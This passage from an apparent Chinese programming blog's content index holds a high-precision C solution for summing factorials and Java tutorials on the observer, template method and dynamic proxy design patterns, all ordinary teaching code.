class="line">    <span class="comment">// 再往下</span></span><br><span class="line">    <span class="keyword">if</span> ((nowX + <span class="number">1</span>) &lt;= n &amp;&amp; !path[nowX + <span class="number">1</span>][nowY]) findPath(nowX + <span class="number">1</span>, nowY);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d%d%d"</span>, &amp;n, &amp;m, &amp;x, &amp;y);</span><br><span class="line">    setHorse();</span><br><span class="line">    <span class="comment">// 先往右</span></span><br><span class="line">    <span class="keyword">if</span> (!path[<span class="number">0</span>][<span class="number">1</span>]) findPath(<span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 再往下</span></span><br><span class="line">    <span class="keyword">if</span> (!path[<span class="number">1</span>][<span class="number">0</span>]) findPath(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>, sum);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>递归</tag>
        <tag>深度优先</tag>
      </tags>
  </entry>
  <entry>
    <title>阶乘求和</title>
    <url>/2020/05/22/%E9%98%B6%E4%B9%98%E6%B1%82%E5%92%8C/</url>
    <content><![CDATA[<blockquote>
<p>题目来源：<a href="https://www.dotcpp.com/oj/problem1014.html" target="_blank" rel="noopener">C语言网1014</a></p>
</blockquote>
<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p> 求Sn=1!+2!+3!+4!+5!+…+n!之值，其中n是一个数字(n不超过20)。 </p>
<h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5</span><br></pre></td></tr></table></figure>

<h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">153</span><br></pre></td></tr></table></figure>

<h2 id="问题求解"><a href="#问题求解" class="headerlink" title="问题求解"></a>问题求解</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-05-22 20:40:31</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-05-22 22:19:56</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\dotcpp\1014.c</span></span><br><span class="line"><span class="comment"> * @祈祷不出现BUG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_NUM 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">factorial</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> factorial[<span class="number">100</span>];</span><br><span class="line">&#125; f;</span><br><span class="line">f num[<span class="number">25</span>];</span><br><span class="line"><span class="keyword">int</span> ans[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">// 高精度存储</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setNum</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (index == <span class="number">1</span>) &#123;</span><br><span class="line">        num[<span class="number">1</span>].factorial[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> c = <span class="number">0</span>, mul = <span class="number">0</span>, i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">1</span>;; i++) &#123;</span><br><span class="line">            mul = (num[index - <span class="number">1</span>].factorial[i] * index + c) % MAX_NUM;</span><br><span class="line">            c = (num[index - <span class="number">1</span>].factorial[i] * index + c) / MAX_NUM;</span><br><span class="line">            num[index].factorial[i] = mul;</span><br><span class="line">            <span class="keyword">if</span> ((mul + c + num[index - <span class="number">1</span>].factorial[i + <span class="number">1</span>]) == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addAns</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c = <span class="number">0</span>, i, sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>;; i++) &#123;</span><br><span class="line">        sum = (ans[i] + num[index].factorial[i] + c) % MAX_NUM;</span><br><span class="line">        c = (ans[i] + num[index].factorial[i] + c) / MAX_NUM;</span><br><span class="line">        ans[i] = sum;</span><br><span class="line">        <span class="keyword">if</span> ((sum + c + ans[i + <span class="number">1</span>]) == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, i, len;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        setNum(i);</span><br><span class="line">        len = addAns(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = len - <span class="number">1</span>; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line">        <span class="comment">// 首位前导零去掉</span></span><br><span class="line">        <span class="keyword">if</span> (ans[i] &lt; <span class="number">10</span> &amp;&amp; i != len - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"0%d"</span>, ans[i]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 个位数补零</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d"</span>, ans[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>阶乘</tag>
        <tag>高精度</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式之观察者模式</title>
    <url>/2020/05/16/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="模式介绍"><a href="#模式介绍" class="headerlink" title="模式介绍"></a>模式介绍</h2><p>定义： 在对象之间定义了一对多的依赖，这样一来，当一个对象改变状态，依赖它的对象会收到通知并自动更新。 类似于公众号订阅模式，公众号发布新通知的时候只有关注了该公众号的用户才会接收该通知。<a id="more"></a></p>
<p>该模式包含四个部分</p>
<ul>
<li>抽象被观察接口：将同类的所有观察者保存在一个集合中，每一个被观察者都可以被若干个观察者观察，该接口至少提供注册观察者和注销观察者方法以及通知观察者方法。</li>
<li>抽象观察者接口： 它定义了一个更新接口，使得在得到被观察者更改通知时产生相应动作。 </li>
<li>被观察者的实现类： 将有关状态存入具体观察者对象，在具体被观察者的内部状态发生改变时，给所有注册过的观察者发送通知。 </li>
<li>观察者的实现类： 实现抽象观察者定义的更新接口，以便在得到主题更改通知时更新自身的状态。 </li>
</ul>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><h3 id="抽象观察者"><a href="#抽象观察者" class="headerlink" title="抽象观察者"></a>抽象观察者</h3><p>提供抽象方法用于更新状态</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Observer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(String msg)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="抽象被观察者"><a href="#抽象被观察者" class="headerlink" title="抽象被观察者"></a>抽象被观察者</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Subject</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> observer 需要注册的观察者</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">registerObserver</span><span class="params">(Observer observer)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> observer 需要注销的观察者</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">removeObserver</span><span class="params">(Observer observer)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> msg 需要发送的通知</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">notify</span><span class="params">(String msg)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="具体观察者"><a href="#具体观察者" class="headerlink" title="具体观察者"></a>具体观察者</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 注意：原生JDK中 java.util.Observer 也有 Observer 接口，我们这里用的是自定义的</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObserverIplm</span> <span class="keyword">implements</span> <span class="title">Observer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ObserverIplm</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">        System.out.println(name + <span class="string">"收到新内容，为："</span> + msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="具体被观察者"><a href="#具体被观察者" class="headerlink" title="具体被观察者"></a>具体被观察者</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SubjectIplm</span> <span class="keyword">implements</span> <span class="title">Subject</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Observer&gt; observerList = <span class="keyword">new</span> ArrayList&lt;Observer&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerObserver</span><span class="params">(Observer observer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.observerList.add(observer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">removeObserver</span><span class="params">(Observer observer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.observerList.remove(observer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 通知所有观察者</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">notify</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (Observer item : observerList) &#123;</span><br><span class="line">            item.update(msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="测试类"><a href="#测试类" class="headerlink" title="测试类"></a>测试类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ObserverTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Subject mySubject = <span class="keyword">new</span> SubjectIplm();</span><br><span class="line">        Observer myObserver1 = <span class="keyword">new</span> ObserverIplm(<span class="string">"myObserver1"</span>);</span><br><span class="line">        Observer myObserver2 = <span class="keyword">new</span> ObserverIplm(<span class="string">"myObserver2"</span>);</span><br><span class="line">        mySubject.registerObserver(myObserver1);</span><br><span class="line">        mySubject.registerObserver(myObserver2);</span><br><span class="line">        mySubject.notify(<span class="string">"震惊！Java居然是世界上最好的语言！"</span>);</span><br><span class="line">        System.out.println(<span class="string">"====================="</span>);</span><br><span class="line">        <span class="comment">// myObserver1 颇为震惊 果断取消订阅（C生万物）</span></span><br><span class="line">        mySubject.removeObserver(myObserver1);</span><br><span class="line">        mySubject.notify(<span class="string">"Java天下第一！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">myObserver1收到新内容，为：震惊！Java居然是世界上最好的语言！</span><br><span class="line">myObserver2收到新内容，为：震惊！Java居然是世界上最好的语言！</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">myObserver2收到新内容，为：Java天下第一！</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li><p>优点：降低了耦合，使得耦合的观察者和被观察者都只依赖于抽象接口，从而各自的变换都不会影响另一方。</p>
</li>
<li><p>缺点：消息通知是顺序进行，那么一个观察者卡顿，会影响整体的执行效率 。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>观察者</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式之模板方法</title>
    <url>/2020/05/14/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>先来看一个简单的例子：假如学院通知开学，那么每个学生所经历的流程就是：收到通知 –&gt; 购票 –&gt; 坐火车/坐飞机/坐大巴/……  –&gt; 返校报道。对应的实现代码如下：<a id="more"></a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.study.design.templateMethod;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        StudenA A = <span class="keyword">new</span> StudenA();</span><br><span class="line">        A.process();</span><br><span class="line">        StudenB B = <span class="keyword">new</span> StudenB();</span><br><span class="line">        B.process();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StudenA</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        receiveNotification();</span><br><span class="line">        buyTicket();</span><br><span class="line">        byTrain();</span><br><span class="line">        register();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">byTrain</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====我在火车上啦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">buyTicket</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====我购票啦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">receiveNotification</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====我收到通知啦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">register</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====我注册完毕啦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StudenB</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        receiveNotification();</span><br><span class="line">        buyTicket();</span><br><span class="line">        byPlane();</span><br><span class="line">        register();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">byPlane</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====我在飞机上啦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">buyTicket</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====我购票啦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">receiveNotification</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====我收到通知啦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">register</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====我注册完毕啦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>观察上面的例子，发现每一个学生有相同之处，也有不同之处，如果每一个学生类都是这么写，就会产生大量冗余代码，而且假如每个学生返校后还要参加开学典礼，那么还要为每一个学生一个方法，在学生类非常多的情况下工作是非常的繁琐。因此我们可以引入<strong>模板方法</strong>。</p>
<h2 id="模板方法"><a href="#模板方法" class="headerlink" title="模板方法"></a>模板方法</h2><p> 定义：定义一个操作中的算法骨架，而将算法的一些步骤延迟到子类中，使得子类可以不改变该算法结构的情况下重定义该算法的某些特定步骤。它是一种类行为型模式。</p>
<h2 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h2><ul>
<li><p>算法的整体步骤大体上固定，也存在不同之处，可以将不同的逻辑业务抽象出来，子类进行实现。例如上文中的“收到通知”、“购票”、“返校报道”</p>
</li>
<li><p>子类有公共的行为，可以提出到父类中，避免代码重复。</p>
</li>
<li><p>需要通过子类判断父类中某个步骤是否执行，从而实现子类对父类的反向控制。</p>
</li>
</ul>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><h3 id="定义抽象模板类"><a href="#定义抽象模板类" class="headerlink" title="定义抽象模板类"></a>定义抽象模板类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseProcess</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        receiveNotification();</span><br><span class="line">        buyTicket();</span><br><span class="line">        backSchool();</span><br><span class="line">        register();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">backSchool</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">buyTicket</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====我购票啦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">receiveNotification</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====我收到通知啦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">register</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====我注册完毕啦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="定义实现类"><a href="#定义实现类" class="headerlink" title="定义实现类"></a>定义实现类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StudentA</span> <span class="keyword">extends</span> <span class="title">BaseProcess</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backSchool</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"===我通过坐飞机返校的==="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StudentB</span> <span class="keyword">extends</span> <span class="title">BaseProcess</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backSchool</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"===我通过坐火车返校的==="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="测试类"><a href="#测试类" class="headerlink" title="测试类"></a>测试类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        BaseProcess A = <span class="keyword">new</span> StudentA();</span><br><span class="line">        A.process();</span><br><span class="line">        BaseProcess B = <span class="keyword">new</span> StudentB();</span><br><span class="line">        B.process();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="模式扩展"><a href="#模式扩展" class="headerlink" title="模式扩展"></a>模式扩展</h2><p> 在模板方法模式中，基本方法包含：抽象方法、具体方法和钩子方法，正确使用“钩子方法”可以使得子类控制父类的行为。 例如上文中，不同学生返校的时候可能还有具体不同的行为，例如单身的学生是直接进入校门然后回到宿舍的，但是有男/女朋友的学生可能进入校门后第一件事就是去见另一半。要实现该逻辑只需要在抽象父类中定义抽象钩子方法，子类实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseProcess</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        receiveNotification();</span><br><span class="line">        buyTicket();</span><br><span class="line">        backSchool();</span><br><span class="line">        <span class="keyword">if</span> (!isSingle()) &#123;</span><br><span class="line">            SeeCouples();</span><br><span class="line">        &#125;</span><br><span class="line">        register();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">backSchool</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">abstract</span> <span class="keyword">boolean</span> <span class="title">isSingle</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">buyTicket</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====我购票啦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">receiveNotification</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====我收到通知啦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">SeeCouples</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"好久不见，我快要想死你了~~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">register</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====我注册完毕啦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StudentB</span> <span class="keyword">extends</span> <span class="title">BaseProcess</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backSchool</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"===我通过坐火车返校的==="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isSingle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="主要缺点"><a href="#主要缺点" class="headerlink" title="主要缺点"></a>主要缺点</h2><ul>
<li>需要为每一个基本方法的不同实现提供一个子类 ，假如父类中可变的基本方法很多，那么势必造成实现的子类非常多，后期维护难度增大。</li>
<li>父类中的抽象方法由子类实现，子类执行的结果会影响父类的结果 ，不仅增加了阅读难度，也 违反了<a href="https://www.cnblogs.com/jimoer/p/9163426.html#autoid-3-2-0" target="_blank" rel="noopener">里氏替换原则</a>，会给程序带来风险。 </li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>模板方法</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式之动态代理</title>
    <url>/2020/05/10/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<p>上文介绍了<a href="https://yalexin.gitee.io/2020/05/10/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/">静态代理</a>,本文介绍动态代理。</p>
<p>所谓动态，是指代理类是动态生成的，而不是我们提前定义好的。</p>
<p>动态代理实现的方式</p>
<ul>
<li>原生JDK（比较常用）</li>
<li>CGLIB（需要导包 cloud-cglib.jar ）</li>
</ul>
<p>这里介绍利用原生JDK的方式实现<a id="more"></a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> study.design.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DynamicProxy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ProxyInvocationHandler pih = <span class="keyword">new</span> ProxyInvocationHandler();</span><br><span class="line">        Cook d_shef = <span class="keyword">new</span> Chef();</span><br><span class="line">        <span class="comment">// 设置需要代理的对象</span></span><br><span class="line">        pih.setTarget(d_shef);</span><br><span class="line">        <span class="comment">// 动态生成代理类</span></span><br><span class="line">        Cook proxy = (Cook) pih.getProxy();</span><br><span class="line">        proxy.cook(<span class="string">"番茄炒蛋"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Cook</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">cook</span><span class="params">(String name)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span 